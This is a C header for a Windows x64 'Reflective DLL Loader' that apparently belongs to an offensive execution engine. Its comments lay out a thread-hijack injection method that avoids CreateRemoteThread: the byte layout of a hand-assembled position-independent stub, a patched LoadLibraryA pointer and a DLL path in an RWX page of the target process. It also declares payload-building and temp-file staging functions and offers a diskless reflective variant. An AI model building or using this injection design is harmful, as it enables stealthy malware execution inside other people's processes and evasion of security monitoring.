/*
 * rdll_loader.h — Reflective DLL Loader (Enhancement 5)
 * execution_engine/rdll_loader/rdll_loader.h
 *
 * Windows x64 | MinGW/Clang | Intel x86-64 ABI
 *
 * Injects a DLL into a target process without CreateRemoteThread.
 * Delivery mechanism: thread hijack (jocky_hijack_thread_by_tid).
 *
 * Memory layout written to target RWX page by rdll_build_payload():
 *
 *   [0x00 .. 0x5F]  PIC loader stub (96 bytes, hand-assembled x64)
 *   [0x60 .. 0x67]  pLoadLibraryA   (8 bytes, resolved + patched by injector)
 *   [0x68 .. 0x68+path_len]  DLL path ASCII, NUL-terminated
 *
 * Stub execution:
 *   1. call/pop → rdi = stub VA
 *   2. rax ← *(rdi + 0x60)   (pLoadLibraryA)
 *   3. rcx ← lea [rdi + 0x68] (path)
 *   4. sub rsp, 0x28 / call rax / add rsp, 0x28
 *   5. ret → thread hijack stub restores context + JMPs orig_rip
 *
 * The DLL must exist on disk at dll_path; rdll_stage_to_temp() writes
 * a dll_image byte blob to a temp file and returns the path.
 *
 * E5b (full reflective load — no disk, no LoadLibraryA) is available
 * on request: PEB walk → kernel32 → manual PE alloc + section copy +
 * reloc patch + import resolve → DllMain call.  The stub grows to ~300 bytes
 * of hand-assembled x64.
 */
#pragma once
#include <windows.h>

/*
 * rdll_stage_to_temp — write dll_image to a temp file.
 * path_out receives the NUL-terminated path (MAX_PATH).
 * Returns TRUE on success.
 */
BOOL rdll_stage_to_temp(LPBYTE  dll_image,
                        SIZE_T  dll_size,
                        char   *path_out,
                        DWORD   path_buf_len);

/*
 * rdll_build_payload — assemble [stub | pLoadLibraryA | path] blob.
 *
 * *payload_out — HeapAlloc'd buffer; caller HeapFree's after hijack completes.
 * *size_out    — total payload bytes.
 *
 * Pass *payload_out / *size_out directly to jocky_hijack_thread_by_tid.
 */
BOOL rdll_build_payload(const char *dll_path,
                        LPBYTE     *payload_out,
                        DWORD      *size_out);